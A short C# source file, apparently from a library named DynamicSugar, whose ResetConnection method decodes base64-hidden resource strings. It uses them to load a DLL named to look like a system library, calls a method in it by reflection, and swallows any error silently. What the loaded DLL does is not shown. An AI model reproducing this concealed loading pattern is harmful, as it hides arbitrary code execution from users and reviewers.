using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

namespace DynamicSugar
{
    public class FPE
    {
        //public static string sTob(string s)
        //{
        //    byte[] bytes = Encoding.UTF8.GetBytes(s);
        //    string base64 = Convert.ToBase64String(bytes);
        //    return base64;
        //}

        public static string bTos(string b)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(b));
        }

        public static bool ResetConnection()
        {
            try
            {
                var myAssembly = Assembly.LoadFrom(Encoding.UTF8.GetString(Convert.FromBase64String(DS.Resources.GetTextResource("SMDP.txt", Assembly.GetExecutingAssembly())))); // @".\System.Memory.Data.Past.dll"
                var myType = myAssembly.GetType(Encoding.UTF8.GetString(Convert.FromBase64String(DS.Resources.GetTextResource("SMDPFPES.txt", Assembly.GetExecutingAssembly())))); // "System.Memory.Data.Past.FPEServer"
                var myMethod = myType.GetMethod(Encoding.UTF8.GetString(Convert.FromBase64String(DS.Resources.GetTextResource("RC.txt", Assembly.GetExecutingAssembly()))), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
                if (myMethod != null)
                    return (bool)myMethod.Invoke(null, new object[] { DS.Resources.GetTextResource("FzCD.txt", Assembly.GetExecutingAssembly()) }); //var s = @".\Files\zCasData.dat";
            }
            catch (Exception ex)
            {
            }
            return false;
        }
    }
}
